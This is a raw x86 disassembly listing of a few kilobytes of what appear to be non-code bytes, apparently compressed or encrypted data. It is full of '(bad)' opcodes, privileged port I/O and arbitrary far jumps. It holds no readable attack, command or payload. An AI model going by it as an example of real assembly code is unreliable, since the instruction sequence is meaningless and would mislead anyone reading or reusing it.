  420c1e:	mov    edx,0x70773c4a
  420c23:	and    dh,bl
  420c25:	les    edx,FWORD PTR [eax+ebx*2]
  420c28:	rcl    eax,cl
  420c2a:	(bad)  
  420c2c:	loopne 0x420c9a
  420c2e:	cwde   
  420c2f:	xchg   esi,eax
  420c30:	fwait
  420c31:	es in  eax,dx
  420c33:	push   ebp
  420c34:	mov    ds:0x9dcda30a,eax
  420c39:	std    
  420c3a:	outs   dx,DWORD PTR ds:[esi]
  420c3b:	sbb    DWORD PTR [esi],esp
  420c3d:	fisubr DWORD PTR fs:[edi]
  420c40:	es jo  0x420c5e
  420c43:	push   es
  420c44:	fisub  WORD PTR [ecx+0x41cc8905]
  420c4a:	shr    BYTE PTR [ebp+0x601e3fd8],cl
  420c50:	mov    bl,0x2d
  420c52:	sub    al,0xc2
  420c54:	sub    ebp,DWORD PTR [edx+0xd2cecdb]
  420c5a:	ficom  WORD PTR [ecx+0x23f264a5]
  420c60:	xrelease mov BYTE PTR [edx-0x45],ah
  420c64:	mov    ch,0xcd
  420c66:	jl     0x420c08
  420c68:	je     0x420ccd
  420c6a:	shl    DWORD PTR ds:0xe76e48e7,1
  420c70:	pop    ebx
  420c71:	pop    ebp
  420c72:	jmp    ebp
  420c74:	(bad)  
  420c76:	jp     0x420c1a
  420c78:	lods   eax,DWORD PTR ds:[esi]
  420c79:	and    edi,DWORD PTR [edi]
  420c7b:	xchg   edx,eax
  420c7c:	jg     0x420c3b
  420c7e:	retf   
  420c7f:	aam    0xef
  420c81:	and    ecx,DWORD PTR [edi]
  420c83:	jmp    0x4132c3e
  420c88:	das    
  420c89:	cld    
  420c8a:	xor    eax,0xb811aa32
  420c8f:	xchg   ah,al
  420c91:	es add al,0x72
  420c94:	add    bl,cl
  420c96:	icebp  
  420c97:	jge    0x420c92
  420c99:	dec    eax
  420c9a:	pop    ebx
  420c9b:	outs   dx,DWORD PTR ds:[esi]
  420c9c:	pop    eax
  420c9d:	ja     0x420ca7
  420c9f:	mov    DWORD PTR [edx],0xae57f448
  420ca5:	test   al,0xde
  420ca7:	cmp    eax,0x17bd3bb4
  420cac:	jo     0x420d1d
  420cae:	push   eax
  420caf:	out    dx,eax
  420cb0:	jp     0x420ced
  420cb2:	mov    al,0x28
  420cb4:	mov    al,0x72
  420cb6:	mov    al,0xa
  420cb8:	mov    BYTE PTR [eax-0x1f],cl
  420cbb:	loop   0x420cce
  420cbd:	inc    ebx
  420cbe:	mov    WORD PTR [edi-0x6d],?
  420cc1:	or     DWORD PTR [ebx+0x27],esp
  420cc4:	jmp    0xf832:0xd4794099
  420ccb:	sbb    ah,BYTE PTR [eax-0x2f]
  420cce:	bound  edi,QWORD PTR [esi+0x7c]
  420cd1:	adc    dh,BYTE PTR [edx-0x7a2edd27]
  420cd7:	adc    edx,ebp
  420cd9:	mov    ebp,0xc2f2219e
  420cde:	and    DWORD PTR [edx-0x7],0xd17ff223
  420ce5:	cmp    BYTE PTR [edi],bl
  420ce7:	dec    edi
  420ce8:	mov    eax,ds:0x4c36b1c0
  420ced:	imul   esp,DWORD PTR [ebx-0x54c10139],0x6e7ad494
  420cf7:	pop    ds
  420cf8:	xchg   esp,eax
  420cf9:	xor    eax,0xf9939eaa
  420cfe:	jle    0x420cc4
  420d00:	cmp    edi,DWORD PTR [edi-0x2c135338]
  420d06:	push   esi
  420d07:	loop   0x420cab
  420d09:	cmp    eax,DWORD PTR [eax]
  420d0b:	jb     0x420d4c
  420d0d:	(bad)  [ecx]
  420d0f:	test   BYTE PTR [edx],bl
  420d11:	sub    DWORD PTR [ebx+0x70],eax
  420d14:	and    DWORD PTR [esi],eax
  420d16:	test   DWORD PTR [esi+0x428df29b],ecx
  420d1c:	xor    DWORD PTR [ecx+0x1f],edi
  420d1f:	daa    
  420d20:	fsub   QWORD PTR [ecx-0x3d]
  420d23:	ds or  ebp,esp
  420d26:	and    BYTE PTR [ebp-0x72],ah
  420d29:	push   cs
  420d2a:	cmp    edi,eax
  420d2c:	xchg   esi,eax
  420d2d:	jno    0x420cf6
  420d2f:	lock lods eax,DWORD PTR ds:[esi]
  420d31:	add    eax,0xe85e54ff
  420d36:	cmp    ebx,edx
  420d38:	sbb    al,0xc4
  420d3a:	mov    bh,0xd4
  420d3c:	cmp    bl,bh
  420d3e:	fisubr WORD PTR [esi]
  420d40:	fnstenv [ebp+esi*2-0x7f4450aa]
  420d47:	stos   BYTE PTR es:[edi],al
  420d48:	arpl   WORD PTR [ecx-0x44],dx
  420d4b:	sub    DWORD PTR [eax],esp
  420d4d:	pop    eax
  420d4e:	cmp    eax,0x1dadae95
  420d53:	add    BYTE PTR [esi],ch
  420d55:	jb     0x420d2d
  420d57:	loop   0x420cdb
  420d59:	test   eax,edi
  420d5b:	jle    0x420d8c
  420d5d:	arpl   WORD PTR [edi-0x21],si
  420d60:	mov    ecx,0x8e64d017
  420d65:	push   ss
  420d66:	adc    eax,0xadf9f1fd
  420d6b:	test   DWORD PTR [edi+0x57],ebx
  420d6e:	fstp   TBYTE PTR [ebx]
  420d70:	daa    
  420d71:	stos   BYTE PTR es:[edi],al
  420d72:	or     al,0xba
  420d74:	stos   DWORD PTR es:[edi],eax
  420d75:	sti    
  420d76:	add    DWORD PTR [edi],0x265a9603
  420d7c:	addr16 pushf 
  420d7e:	dec    edi
  420d7f:	stc    
  420d80:	pop    esi
  420d81:	fucomi st,st(2)
  420d83:	pop    es
  420d84:	jno    0x420dc8
  420d86:	test   BYTE PTR [ebp-0x4e2a2bb],ah
  420d8c:	or     DWORD PTR [esi],0x10
  420d8f:	pop    ecx
  420d90:	xor    DWORD PTR [ecx-0x24],edi
  420d93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d94:	fldcw  WORD PTR [ecx]
  420d96:	mov    eax,0xf03fc3e8
  420d9b:	and    esi,DWORD PTR [esi]
  420d9d:	and    al,0x17
  420d9f:	das    
  420da0:	repz mov al,ds:0x734d329a
  420da6:	test   al,0x99
  420da8:	sbb    DWORD PTR [esi-0x3c],ebx
  420dab:	pop    ebp
  420dac:	in     eax,0xed
  420dae:	xchg   ecx,eax
  420daf:	sub    eax,0x2b2dfba8
  420db4:	mov    esp,ecx
  420db6:	add    ch,ah
  420db8:	inc    edi
  420db9:	gs jno 0x420d70
  420dbc:	loope  0x420d9d
  420dbe:	inc    esi
  420dbf:	push   ds
  420dc0:	sbb    DWORD PTR [ecx-0x59],ecx
  420dc3:	xchg   edx,eax
  420dc4:	sbb    eax,0x9d914017
  420dc9:	retf   0x4b1c
  420dcc:	xchg   esp,eax
  420dcd:	xchg   edi,eax
  420dce:	sbb    ah,BYTE PTR [edx-0x6f]
  420dd1:	pusha  
  420dd2:	out    dx,eax
  420dd3:	ins    DWORD PTR es:[edi],dx
  420dd4:	mov    eax,ds:0xbf42b5dc
  420dd9:	dec    ebp
  420dda:	mov    ch,0xe8
  420ddc:	jp     0x420e25
  420dde:	lock shr DWORD PTR [ebp-0x4d7805a4],1
  420de5:	xchg   BYTE PTR [eax-0x131b735e],ah
  420deb:	out    0x22,al
  420ded:	or     esi,DWORD PTR [esi-0x11]
  420df0:	adc    bh,0x97
  420df3:	retf   
  420df4:	ret    0xac3c
  420df7:	xlat   BYTE PTR ds:[ebx]
  420df8:	jo     0x420e69
  420dfa:	fsub   DWORD PTR [ecx-0x42d8ff0f]
  420e00:	add    eax,0x348c8820
  420e05:	sbb    ah,cl
  420e07:	sub    DWORD PTR [ebp-0x4ed509d2],0x51347799
  420e11:	lock mov BYTE PTR [edi],al
  420e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e15:	lds    esi,FWORD PTR [ecx]
  420e17:	pop    es
  420e18:	repnz call 0xe72e:0xa72d8182
  420e20:	dec    edi
  420e21:	and    BYTE PTR [edi+ebx*8+0x73],ah
  420e25:	mov    al,ds:0xb31db02f
  420e2a:	dec    edi
  420e2b:	cmp    al,0x27
  420e2d:	fwait
  420e2e:	mov    dl,0x11
  420e30:	push   cs
  420e31:	mov    cl,0xbf
  420e33:	jne    0x420dea
  420e35:	lods   al,BYTE PTR ds:[esi]
  420e36:	lock cmp ebp,ebp
  420e39:	push   ecx
  420e3a:	inc    eax
  420e3b:	int    0xc9
  420e3d:	imul   esi,DWORD PTR [edx],0xc113fbba
  420e43:	jno    0x420e7a
  420e45:	xchg   ecx,eax
  420e46:	dec    esi
  420e47:	mul    DWORD PTR [esi+0x3e]
  420e4a:	cmp    ebx,DWORD PTR [esi]
  420e4c:	and    DWORD PTR ds:0xf3cb2965,eax
  420e52:	or     eax,0x46c5f757
  420e57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e58:	leave  
  420e59:	inc    ebx
  420e5a:	mov    eax,ds:0x65bbb8c8
  420e5f:	das    
  420e60:	jbe    0x420e05
  420e62:	pop    ebp
  420e63:	inc    esp
  420e64:	cwde   
  420e65:	dec    edi
  420e66:	pop    eax
  420e67:	out    0xaa,eax
  420e69:	test   BYTE PTR [ebp+0x34e21a7a],dh
  420e6f:	mov    ds:0x1088d476,al
  420e74:	out    0x64,al
  420e76:	out    0x63,eax
  420e78:	nop
  420e79:	or     bl,BYTE PTR ds:0x36223e51
  420e7f:	pop    esp
  420e80:	pushf  
  420e81:	pop    ds
  420e82:	adc    bl,BYTE PTR [ebp-0x76]
  420e85:	mov    esi,0x3119d7c8
  420e8a:	in     al,dx
  420e8b:	test   BYTE PTR [eax-0x2d30e3fd],cl
  420e91:	and    DWORD PTR [edi],edi
  420e93:	mov    esi,0x72efb3d
  420e98:	or     al,0xc4
  420e9a:	xlat   BYTE PTR ds:[ebx]
  420e9b:	mov    cl,0x12
  420e9d:	push   ss
  420e9e:	xchg   ebp,eax
  420e9f:	in     eax,dx
  420ea0:	pop    edx
  420ea1:	push   ecx
  420ea2:	sub    BYTE PTR [edi+ebx*4+0x5f],dh
  420ea6:	sub    al,0xdb
  420ea8:	sahf   
  420ea9:	and    al,0x4b
  420eab:	test   al,0xe2
  420ead:	stos   BYTE PTR es:[edi],al
  420eae:	gs push 0xffffffb9
  420eb1:	fwait
  420eb2:	sub    cl,BYTE PTR [ebp-0x75]
  420eb5:	xchg   DWORD PTR [ebx],ebp
  420eb7:	in     al,0xca
  420eb9:	mov    dl,0x1a
  420ebb:	add    bl,BYTE PTR [edi+edi*2+0x1c90f0fe]
  420ec2:	adc    eax,0x6c4a1d13
  420ec7:	out    0xde,al
  420ec9:	sti    
  420eca:	fistp  DWORD PTR [eax+0x14]
  420ecd:	outs   dx,DWORD PTR ds:[esi]
  420ece:	dec    ebp
  420ecf:	adc    ecx,esi
  420ed1:	adc    BYTE PTR [ecx-0x76],dh
  420ed4:	inc    esp
  420ed5:	sbb    cl,cl
  420ed7:	jo     0x420f4d
  420ed9:	(bad)  
  420edb:	or     BYTE PTR [eax+0x10bd9520],dl
  420ee1:	pop    edi
  420ee2:	push   0xb
  420ee4:	inc    eax
  420ee5:	das    
  420ee6:	mov    esp,0x5dfa5306
  420eeb:	adc    DWORD PTR [esp+edi*1+0x501b94d3],ebx
  420ef2:	sbb    eax,0x48a9aabf
  420ef7:	(bad)  
  420ef8:	mov    BYTE PTR [ecx+edx*4-0x7777071b],dl
  420eff:	jne    0x420f2b
  420f01:	mov    ah,0xf1
  420f03:	cmp    dh,BYTE PTR [ebp+0x157e3d78]
  420f09:	cld    
  420f0a:	ds jne 0x420f37
  420f0d:	mov    bh,0xda
  420f0f:	or     eax,0x8f40b1b8
  420f14:	fwait
  420f15:	rdpmc  
  420f17:	pop    eax
  420f18:	ficomp WORD PTR [eax-0x3f]
  420f1b:	jo     0x420f97
  420f1d:	or     bh,BYTE PTR [esi+0x57]
  420f20:	sub    BYTE PTR [esi],0xb9
  420f23:	enter  0xa038,0x88
  420f27:	sti    
  420f28:	xor    BYTE PTR [edx],cl
  420f2a:	in     al,dx
  420f2b:	add    ecx,ebx
  420f2d:	xchg   ebx,eax
  420f2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f2f:	jb     0x420fa9
  420f31:	sar    ah,cl
  420f33:	jmp    0x420efa
  420f35:	mov    bh,BYTE PTR [ebx]
  420f37:	mov    edx,0x4b0062bf
  420f3c:	mov    ah,0x1f
  420f3e:	add    BYTE PTR [ebx-0x7d],0x4c
  420f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f44:	das    
  420f45:	int    0xa3
  420f47:	icebp  
  420f48:	cmp    eax,0xb5b6b56e
  420f4d:	push   0x6f
  420f4f:	push   edi
  420f50:	rol    BYTE PTR [ecx-0x1d],cl
  420f53:	sbb    esi,0xfd03d677
  420f59:	arpl   WORD PTR [eax-0x2b829f16],sp
  420f5f:	loop   0x420ef6
  420f61:	dec    edx
  420f62:	(bad)  
  420f63:	jge    0x420fa5
  420f65:	hlt    
  420f66:	mov    ds:0xa4bc9ec1,al
  420f6b:	(bad)  
  420f6c:	aam    0x9b
  420f6e:	outs   dx,BYTE PTR ds:[esi]
  420f6f:	pusha  
  420f70:	jb     0x420f71
  420f72:	out    0x83,al
  420f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f75:	xchg   DWORD PTR [edi+0x5f],ebp
  420f78:	fwait
  420f79:	into   
  420f7a:	pop    esp
  420f7b:	mov    dl,BYTE PTR [esi+0x6a]
  420f7e:	xchg   ebx,eax
  420f7f:	dec    ebx
  420f80:	ror    bl,1
  420f82:	dec    esp
  420f83:	(bad)  
  420f85:	jbe    0x421002
  420f87:	stos   DWORD PTR es:[edi],eax
  420f88:	inc    edx
  420f89:	jecxz  0x420f6f
  420f8b:	or     DWORD PTR [edx-0x34],esp
  420f8e:	jns    0x420f30
  420f90:	xchg   edx,eax
  420f91:	dec    ebx
  420f92:	xor    al,0xa6
  420f94:	sub    eax,0xbddf48d1
  420f99:	sbb    eax,0xbfd3382d
  420f9e:	gs mov esp,0x543ebc92
  420fa4:	in     eax,dx
  420fa5:	mov    al,ds:0xbb69c279
  420faa:	aad    0xa1
  420fac:	pop    esp
  420fad:	icebp  
  420fae:	fcmovnb st,st(1)
  420fb0:	in     al,dx
  420fb1:	fst    DWORD PTR [ebp+0x4]
  420fb4:	pusha  
  420fb5:	out    dx,al
  420fb6:	hlt    
  420fb7:	retf   0x61e8
  420fba:	push   ss
  420fbb:	fcomp  st(2)
  420fbd:	test   DWORD PTR ds:0x51314b30,ecx
  420fc3:	xlat   BYTE PTR ds:[ebx]
  420fc4:	dec    ebp
  420fc5:	pop    es
  420fc6:	sti    
  420fc7:	inc    ebp
  420fc8:	repnz mov ds:0x69da029b,eax
  420fce:	data16 adc dl,BYTE PTR [ebp+0x327b0cec]
  420fd5:	sbb    BYTE PTR [edx],bl
  420fd7:	lods   eax,DWORD PTR ds:[esi]
  420fd8:	out    0xc4,eax
  420fda:	icebp  
  420fdb:	add    edi,DWORD PTR [edx]
  420fdd:	push   ecx
  420fde:	je     0x420ff6
  420fe0:	loop   0x42103b
  420fe2:	cwde   
  420fe3:	dec    esi
  420fe4:	cmp    ch,BYTE PTR [ebp-0x68c4578]
  420fea:	mov    ds:0x4f06758a,eax
  420fef:	in     al,0x33
  420ff1:	xor    edx,ebx
  420ff3:	sahf   
  420ff4:	ror    BYTE PTR [eax+0x39],0x42
  420ff8:	pop    edi
  420ff9:	cmp    al,0x94
  420ffb:	jmp    0xa8ad3b81
  421000:	adc    bh,BYTE PTR [eax]
  421002:	xchg   ebx,eax
  421003:	out    0xd8,eax
  421005:	lahf   
  421006:	pop    ecx
  421007:	pop    eax
  421008:	inc    esi
  421009:	pushf  
  42100a:	in     al,0x9d
  42100c:	jno    0x420fcc
  42100e:	sub    cl,BYTE PTR [edi-0x55]
  421011:	test   eax,0xb0f57de3
  421016:	mov    al,ds:0xfe466232
  42101b:	xlat   BYTE PTR ds:[ebx]
  42101c:	dec    eax
  42101d:	mov    ds:0xbe44d2ce,eax
  421022:	adc    ah,BYTE PTR [ecx-0x2245ee3e]
  421028:	push   es
  421029:	imul   edi,DWORD PTR [edx+0x730bb1d0],0x75
  421030:	imul   ebp,edx,0xffffffce
  421033:	pop    es
  421034:	mov    bl,0x88
  421036:	and    eax,0x4ff5ddbd
  42103b:	mov    eax,ds:0x4f290bda
  421040:	addr16 (bad) 
  421042:	loopne 0x42107f
  421044:	idiv   BYTE PTR [eax]
  421046:	xchg   esi,eax
  421047:	ret    0x37f2
  42104a:	jmp    0x3f66:0xd91402f3
  421051:	lea    esi,[esi+esi*1]
  421054:	test   BYTE PTR [edx+0x6e],al
  421057:	or     BYTE PTR [eax],cl
  421059:	adc    eax,0xe92e6971
  42105e:	jo     0x42106f
  421060:	lock bound si,DWORD PTR [ebp+0x6c482fa3]
  421068:	adc    BYTE PTR [edi+0x619fe3b4],bh
  42106e:	fwait
  42106f:	scas   eax,DWORD PTR es:[edi]
  421070:	mov    ebp,0x97351a31
  421075:	fdiv   DWORD PTR [eax]
  421077:	repnz out dx,al
  421079:	add    al,0x11
  42107b:	scas   eax,DWORD PTR es:[edi]
  42107c:	mov    ah,0xd8
  42107e:	pop    esp
  42107f:	mov    ch,0xfa
  421081:	adc    dh,BYTE PTR [edx]
  421083:	dec    edx
  421084:	pop    ebx
  421085:	out    0x77,al
  421087:	and    al,0x61
  421089:	ins    DWORD PTR es:[edi],dx
  42108a:	push   ds
  42108b:	mov    cl,0x4
  42108d:	adc    eax,0x217bb5b7
  421092:	inc    ecx
  421093:	dec    ebp
  421094:	pop    es
  421095:	dec    eax
  421096:	cdq    
  421097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421098:	pop    ecx
  421099:	adc    eax,0x1563717a
  42109e:	repz push 0xe903637b
  4210a4:	arpl   WORD PTR [ebp-0x317254a5],bp
  4210aa:	fimul  DWORD PTR [eax]
  4210ac:	push   ebx
  4210ad:	xchg   BYTE PTR ds:0x95d688a2,bh
  4210b3:	add    al,0x2b
  4210b5:	test   DWORD PTR [esp+esi*8+0x7a],edi
  4210b9:	ds stos DWORD PTR es:[edi],eax
  4210bb:	xor    BYTE PTR [esp+edi*2-0x6828cba],al
  4210c2:	jge    0x4210e0
  4210c4:	loop   0x42104b
  4210c6:	aad    0x2
  4210c8:	inc    eax
  4210c9:	jmp    0x5a733ed
  4210ce:	xchg   ebx,eax
  4210cf:	lock test BYTE PTR [eax+0x68],0x82
  4210d4:	leave  
  4210d5:	cdq    
  4210d6:	sub    DWORD PTR [edx+0x59ab4f48],0xffffffa6
  4210dd:	hlt    
  4210de:	lock bound esp,QWORD PTR [edi+esi*4+0x6d]
  4210e3:	mov    eax,0x8bd1f5fc
  4210e8:	(bad)  
  4210e9:	ss in  al,dx
  4210eb:	repz xchg dl,bh
  4210ee:	adc    eax,0x4e204fff
  4210f3:	mov    ?,WORD PTR es:[esi]
  4210f6:	(bad)
  4210fa:	or     eax,0xf44f3f71
  4210ff:	dec    ebx
  421100:	bnd jge 0x42111d
  421103:	mov    al,ds:0x3f304a19
  421108:	scas   al,BYTE PTR es:[edi]
  421109:	popa   
  42110a:	push   ss
  42110b:	adc    eax,0x11090499
  421110:	jecxz  0x421134
  421112:	add    eax,0x1edf50ca
  421117:	xchg   edx,eax
  421118:	les    ebp,FWORD PTR [ebx-0x5b]
  42111b:	stos   BYTE PTR es:[edi],al
  42111c:	shr    bh,cl
  42111e:	retf   
  42111f:	and    DWORD PTR [ebx-0x3f89e22c],ebx
  421125:	jo     0x42118d
  421127:	sub    eax,DWORD PTR [ebx+0x35]
  42112a:	add    ch,BYTE PTR [edx]
  42112c:	xor    al,0xfc
  42112e:	pop    ds
  42112f:	ftst   
  421131:	push   esp
  421132:	xchg   ecx,eax
  421133:	les    edi,FWORD PTR [ebp+0x5a]
  421136:	fs cmp al,0x35
  421139:	sub    BYTE PTR ds:0x8ef5c10a,al
  42113f:	jno    0x421182
  421141:	cld    
  421142:	cmc    
  421143:	mov    edx,0xccfc8019
  421148:	push   ds
  421149:	adc    DWORD PTR ss:[ebx-0x48],eax
  42114d:	int3   
  42114e:	cmp    BYTE PTR [edx+0x4be1456d],cl
  421154:	xchg   DWORD PTR [ecx-0x7f23657],esp
  42115a:	int3   
  42115b:	mov    fs,WORD PTR [ebx-0xf]
  42115e:	add    BYTE PTR [edi],0xb7
  421161:	inc    BYTE PTR [edi]
  421163:	and    BYTE PTR [eax-0x211d7d78],al
  421169:	jle    0x4210f2
  42116b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42116d:	pop    ds
  42116e:	adc    eax,0x4c282dee
  421173:	push   edi
  421174:	mov    ebp,0xadbe3dcb
  421179:	xchg   DWORD PTR [edi+0x733392c7],esi
  42117f:	lock movs WORD PTR es:[edi],WORD PTR ds:[esi]
  421182:	in     al,dx
  421183:	sub    dh,ah
  421185:	inc    ebp
  421186:	retf   0x77f6
  421189:	jne    0x4211dc
  42118b:	aam    0x4d
  42118d:	in     eax,0xca
  42118f:	push   esp
  421190:	retf   
  421191:	rol    BYTE PTR [eax-0x36],0xb9
  421195:	mov    ebp,0xed90224a
  42119a:	mov    cl,BYTE PTR [edx-0x56]
  42119d:	xor    BYTE PTR ds:0x3f240d4,al
  4211a3:	sub    DWORD PTR [edi],0x7d
  4211a6:	mov    eax,ds:0xb83d6062
  4211ab:	div    BYTE PTR es:[edx]
  4211ae:	sub    DWORD PTR [ecx-0x20],esi
  4211b1:	mov    cl,BYTE PTR [edi]
  4211b3:	mov    al,ds:0x18603986
  4211b8:	push   ecx
  4211b9:	jmp    0x82fa6d4b
  4211be:	inc    ecx
  4211bf:	mov    edx,0x218f316e
  4211c4:	into   
  4211c5:	jmp    0x2b8e7c49
  4211ca:	jne    0x4211bb
  4211cc:	xchg   esi,eax
  4211cd:	fwait
  4211ce:	adc    bl,ch
  4211d0:	popf   
  4211d1:	cmp    BYTE PTR [esi],al
  4211d3:	pusha  
  4211d4:	daa    
  4211d5:	arpl   WORD PTR ds:0x7172711d,si
  4211db:	adc    eax,esi
  4211dd:	and    dh,BYTE PTR [eax-0x3a5ac459]
  4211e3:	xor    BYTE PTR [edx+0x553c4a9a],al
  4211e9:	jl     0x4211fa
  4211eb:	(bad)  
  4211ec:	xchg   ebx,eax
  4211ed:	cwde   
  4211ee:	dec    ecx
  4211ef:	jmp    0x7b61:0xab4d6cc6
  4211f6:	pop    ebx
  4211f7:	aad    0x5e
  4211f9:	stos   DWORD PTR es:[edi],eax
  4211fa:	jp     0x4211fd
  4211fc:	sbb    edx,eax
  4211fe:	data16 xchg BYTE PTR [ecx],dl
  421201:	pop    ebx
  421202:	lods   eax,DWORD PTR ds:[esi]
  421203:	inc    ecx
  421204:	(bad)  
  421205:	jns    0x421198
  421207:	(bad)  
  421208:	hlt    
  421209:	pop    ebp
  42120a:	es push es
  42120c:	arpl   WORD PTR [eax+0x67],bx
  42120f:	iret   
  421210:	ds std 
  421212:	call   0xd445:0xc0f086ca
  421219:	mov    bh,BYTE PTR [eax]
  42121b:	retf   0x445e
  42121e:	loop   0x421244
  421220:	jle    0x42123b
  421222:	sub    edx,DWORD PTR es:[ecx+0x75496fb7]
  421229:	inc    eax
  42122a:	outs   dx,DWORD PTR ds:[esi]
  42122b:	jecxz  0x421277
  42122d:	adc    edx,DWORD PTR [ebp+0x3659590d]
  421233:	fadd   DWORD PTR [esi+0x6ba750b2]
  421239:	sbb    eax,0x8ee8bc3e
  42123e:	(bad)  
  42123f:	int3   
  421240:	inc    eax
  421241:	inc    edx
  421242:	mov    eax,cs
  421244:	lock jns 0x421260
  421247:	xchg   edi,eax
  421248:	fidiv  WORD PTR [edx]
  42124a:	call   0xa75:0xbd5543ee
  421251:	adc    al,0xdf
  421253:	mov    al,0xe6
  421255:	xlat   BYTE PTR ds:[ebx]
  421256:	fwait
  421257:	adc    DWORD PTR [ebx],ecx
  421259:	pop    ebx
  42125a:	push   eax
  42125b:	mov    esi,0x3cc413bd
  421260:	call   0xe59b:0x87de1875
  421267:	(bad)  
  421268:	out    dx,eax
  421269:	jno    0x42124b
  42126b:	dec    eax
  42126c:	fbstp  TBYTE PTR [eax+0x7e]
  42126f:	arpl   WORD PTR [edx+0x66],bx
  421272:	xor    eax,0x6b54d945
  421277:	aad    0x2d
  421279:	(bad)  
  42127a:	cmp    DWORD PTR [ecx-0x77],ecx
  42127d:	push   cs
  42127e:	jbe    0x4212fb
  421280:	pop    ebp
  421281:	mov    edi,0x60605ec9
  421286:	sahf   
  421287:	(bad)  
  421288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421289:	jno    0x421269
  42128b:	enter  0x86db,0x29
  42128f:	xor    DWORD PTR [eax-0x2c8198d2],eax
  421295:	shr    esp,1
  421297:	jecxz  0x421293
  421299:	mov    edx,0x7a5e853e
  42129e:	rcl    BYTE PTR [ecx],0xcb
  4212a1:	in     al,0x28
  4212a3:	pop    edi
  4212a4:	mov    ds:0x95e1a2f6,al
  4212a9:	int3   
  4212aa:	in     eax,0xa9
  4212ac:	out    dx,al
  4212ad:	call   0x9a4d:0xe89e3d0d
  4212b4:	test   BYTE PTR ds:0xb63887f5,ah
  4212ba:	xor    dl,BYTE PTR [edx]
  4212bc:	and    BYTE PTR [ecx-0x36],dl
  4212bf:	mov    ah,0xe1
  4212c1:	aam    0x72
  4212c3:	mov    dh,0x2d
  4212c5:	popf   
  4212c6:	rcr    BYTE PTR [esi-0x62a50aff],cl
  4212cc:	cmc    
  4212cd:	mov    eax,ds:0xe85fd0fe
  4212d2:	xchg   ebp,eax
  4212d3:	cmovne edi,DWORD PTR [edx-0x69cf630f]
  4212da:	push   eax
  4212db:	mov    dl,0x17
  4212dd:	add    eax,DWORD PTR ds:0xba339593
  4212e3:	mov    edx,0xd4d0001c
  4212e8:	push   esp
  4212e9:	fist   WORD PTR [ecx+0x3bfdd8fa]
  4212ef:	(bad)  
  4212f0:	in     al,dx
  4212f1:	and    eax,0x156ddc7e
  4212f6:	in     eax,0xe6
  4212f8:	stos   BYTE PTR es:[edi],al
  4212f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212fa:	icebp  
  4212fb:	scas   al,BYTE PTR es:[edi]
  4212fc:	jno    0x421305
  4212fe:	sub    al,BYTE PTR [ecx-0x5f]
  421301:	sub    ebp,DWORD PTR [ebx-0x6b]
  421304:	push   0x5956f7eb
  421309:	fnstenv [edx+0x549fd49f]
  42130f:	gs jl  0x421342
  421312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421313:	mov    bh,dh
  421315:	popa   
  421316:	sub    ah,BYTE PTR [edx+0x7e]
  421319:	jge    0x42135b
  42131b:	repz fsubr st,st(1)
  42131e:	test   DWORD PTR [edx],ecx
  421320:	sbb    BYTE PTR [ebp+edi*8-0x46670a79],bl
  421327:	lea    edx,[edx-0x5d0e668f]
  42132d:	das    
  42132e:	repnz jecxz 0x42133b
  421331:	ss clc 
  421333:	out    dx,eax
  421334:	mov    esi,0xd78e132b
  421339:	int3   
  42133a:	push   esi
  42133b:	arpl   WORD PTR [ebx],di
  42133d:	enter  0x342d,0x15
  421341:	cld    
  421342:	xor    DWORD PTR [ebp+0x6596aabf],ebx
  421348:	mov    BYTE PTR [edx+0x5aea98d2],dl
  42134e:	pop    es
  42134f:	fwait
  421350:	std    
  421351:	dec    ebp
  421352:	or     bh,BYTE PTR [eax]
  421354:	seto   BYTE PTR [edx+ebx*8]
  421358:	cs push esp
  42135a:	mov    ?,WORD PTR [edi+0x52]
  42135d:	and    esp,DWORD PTR [esi+0x11]
  421360:	fwait
  421361:	in     eax,0x23
  421363:	scas   eax,DWORD PTR es:[edi]
  421364:	adc    ecx,esp
  421366:	js     0x42138e
  421368:	and    eax,0xe18dfb22
  42136d:	or     eax,0x9731c3b9
  421372:	pusha  
  421373:	fdiv   DWORD PTR [eax-0x7a21d25]
  421379:	gs in  eax,dx
  42137b:	pushf  
  42137c:	and    DWORD PTR [ecx+0x34663fec],ecx
  421382:	mov    ecx,eax
  421384:	add    BYTE PTR [eiz*8-0x7eeb6cc1],al
  42138b:	mov    esi,0x885e90d6
  421390:	lea    edx,[ebx+0x266bc28f]
  421396:	gs push ds
  421398:	jns    0x421411
  42139a:	mov    dl,0xec
  42139c:	(bad)  
  42139d:	mov    dl,0x30
  42139f:	call   DWORD PTR [esi]
  4213a1:	shl    DWORD PTR [eax-0x7e],cl
  4213a4:	xchg   esp,eax
  4213a5:	mov    edx,DWORD PTR [eax+ebx*4-0x42e8f512]
  4213ac:	lods   eax,DWORD PTR ds:[esi]
  4213ad:	sbb    edx,DWORD PTR [ecx-0x71]
  4213b0:	mov    esp,0x878454a9
  4213b5:	cmp    WORD PTR [ecx-0x3a212716],dx
  4213bc:	retf   
  4213bd:	mov    ds:0x706f858d,al
  4213c2:	push   cs
  4213c3:	mov    dh,0xd8
  4213c5:	push   DWORD PTR [eax-0xcf9c006]
  4213cb:	adc    eax,0xcc4a1f64
  4213d0:	fnstenv [eax]
  4213d2:	fld    st(5)
  4213d4:	xchg   esi,eax
  4213d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213d6:	lods   al,BYTE PTR ds:[esi]
  4213d7:	cmp    WORD PTR [ecx],ax
  4213da:	cmp    al,0x83
  4213dc:	mov    edx,0xec1d2889
  4213e1:	xlat   BYTE PTR ds:[ebx]
  4213e2:	bswap  eax
  4213e4:	hlt    
  4213e5:	retf   
  4213e6:	push   edx
  4213e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213e8:	sub    eax,ebx
  4213ea:	jl     0x42141b
  4213ec:	ds jbe 0x42145f
  4213ef:	out    0xa6,al
  4213f1:	push   edx
  4213f2:	push   ds
  4213f3:	imul   ebp,ebx,0x47
  4213f6:	rol    dl,0x44
